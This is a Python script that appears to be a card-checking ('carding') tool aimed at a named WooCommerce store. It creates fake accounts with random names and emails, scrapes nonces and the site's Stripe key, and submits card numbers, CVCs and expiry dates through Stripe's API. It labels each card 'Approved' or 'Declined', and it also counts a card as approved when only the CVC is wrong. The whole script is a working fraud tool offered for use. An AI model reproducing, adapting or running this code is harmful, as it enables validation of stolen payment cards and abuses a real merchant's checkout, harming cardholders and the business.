import requests
import re
import base64
import json
import names
import random
from fake_useragent import UserAgent
import time
import uuid

import time
from requests import Session

import time
import webbrowser
from bs4 import BeautifulSoup
from dataclasses import dataclass



def paserX(data, first, last):
    try:
        return re.search(f'{first}(.*?){last}', data).group(1)
    except:
        return None 
    
Agent = UserAgent().random

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session
@dataclass
class stri2:
    def main(self, card):
        try:
            
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"

            session = requests.Session()

            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
            headers = {
                'User-Agent': Agent,
                'Accept': 'text/html,application/xhtml+xml',
            }

            response = session.get('https://svensaw.com/my-account/', headers=headers).text
            reigs = paserX(response, 'name="woocommerce-register-nonce" value="', '"')
            print(reigs)
            data = {
                'email': CorreoRand,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': 'https://svensaw.com/my-account/payment-methods/',
                'wc_order_attribution_session_entry': 'https://svensaw.com/my-account/add-payment-method/',
                'wc_order_attribution_user_agent': Agent,
                'woocommerce-register-nonce': reigs,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }

            response = session.post('https://svensaw.com/my-account/', headers=headers, data=data)
            response = session.get('https://svensaw.com/my-account/add-payment-method/', headers=headers).text
            pklive = paserX(response, '"key":"','",')
            ajas = paserX(response, '"createAndConfirmSetupIntentNonce":"','"')
            print(ajas)
            print(pklive)

            data = f'type=card&card[number]={self.ccs[0]}&card[cvc]={self.ccs[3]}&card[exp_year]={self.ccs[2]}&card[exp_month]={self.ccs[1]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2F043dabd2b9%3B+stripe-js-v3%2F043dabd2b9%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fsvensaw.com&time_on_page=381724&client_attribution_metadata[client_session_id]={str(uuid.uuid4())}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1061s5Zshyo&client_attribution_metadata[elements_session_config_id]={str(uuid.uuid4())}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pklive}&_stripe_version=2024-06-20&'

            response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
            id = response['id']
            print(id)

            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajas,
            }

            response = session.post('https://svensaw.com/wp-admin/admin-ajax.php', headers=headers, data=data)            
            data = response.json()
            print(data)
            error = data['success'] and data['data']['status'] == 'succeeded'
            if error: return 'Approved! ✅', data['data']['status']
            elif "Your card's security code is incorrect." in data: return 'Approved! ✅', data
            else: return 'Declined ❌', data['data']['status']
        except: return 'Declined ❌','Your card was declined.'
